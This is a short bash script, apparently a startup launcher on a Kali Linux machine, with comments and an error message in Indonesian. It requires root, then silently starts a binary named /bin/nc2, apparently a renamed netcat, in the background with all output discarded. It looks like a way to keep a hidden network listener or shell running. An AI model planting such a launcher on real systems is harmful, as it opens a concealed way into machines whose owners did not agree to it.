#!/bin/bash

if [[ "$(id -u)" != "0" ]];then
 echo "    GAGAL !!!,kamu harus dalam mode root"
 exit 0
fi

# while [ "$(who -r | awk '{print $2}')" != "5" ]; do sleep 1; done


# nohup /bin/nc2 > /home/kali/Desktop/logNC.txt 2> /home/kali/Desktop/logNC.txt &
nohup /bin/nc2 > /dev/null 2> /dev/null &
exit 0
